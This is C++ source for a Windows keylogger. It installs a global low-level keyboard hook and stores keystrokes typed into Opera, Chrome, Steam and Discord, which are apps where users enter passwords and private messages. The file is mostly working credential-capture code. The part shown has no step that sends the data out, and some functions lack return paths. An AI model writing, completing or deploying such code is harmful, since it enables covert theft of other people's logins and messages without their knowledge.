#include "Key-Log.h"

std::string KL::get_active_process_name()
{
	DWORD process_id;
	GetWindowThreadProcessId(GetForegroundWindow(), &process_id);
	HANDLE h_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
	if (h_process != NULL) {
		TCHAR process_name[MAX_PATH];
		if (GetModuleFileNameEx(h_process, NULL, process_name, MAX_PATH) != 0) {
			CloseHandle(h_process);
			std::filesystem::path full_path(process_name);

			return full_path.filename().string();
		}
		CloseHandle(h_process);
	}
	return "";
}

bool KL::set_hook()
{
	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keyboard_proc, NULL, 0);
	if (g_hook == NULL) {
#ifdef _MSC_VER
		std::cerr << "Failed to install keyboard hook" << std::endl;
#endif
		return false;
	}
	return true;
}

bool KL::remove_hook()
{
	// Unhook the keyboard hook
	if (KL::g_hook != NULL) {
		UnhookWindowsHookEx(KL::g_hook);
	}
}

LRESULT KL::keyboard_proc(int n_code, WPARAM w_param, LPARAM l_param)
{
	if (n_code >= 0) {

		std::string process_name = KL::get_active_process_name();
		std::string applications_to_log[4] = { "opera.exe", "steam.exe", "discord.exe", "chrome.exe" };

		for (const auto& app : applications_to_log) {

			if (process_name.find(app) != std::string::npos) {

				KBDLLHOOKSTRUCT* p_key_info = reinterpret_cast<KBDLLHOOKSTRUCT*>(l_param);
				if (w_param == WM_KEYDOWN) {
					char key = MapVirtualKey(p_key_info->vkCode, MAPVK_VK_TO_CHAR);
					KL::pressed_keys.push_back(key);
				}
				break;
			}
		}

		return CallNextHookEx(KL::g_hook, n_code, w_param, l_param);
	}
}
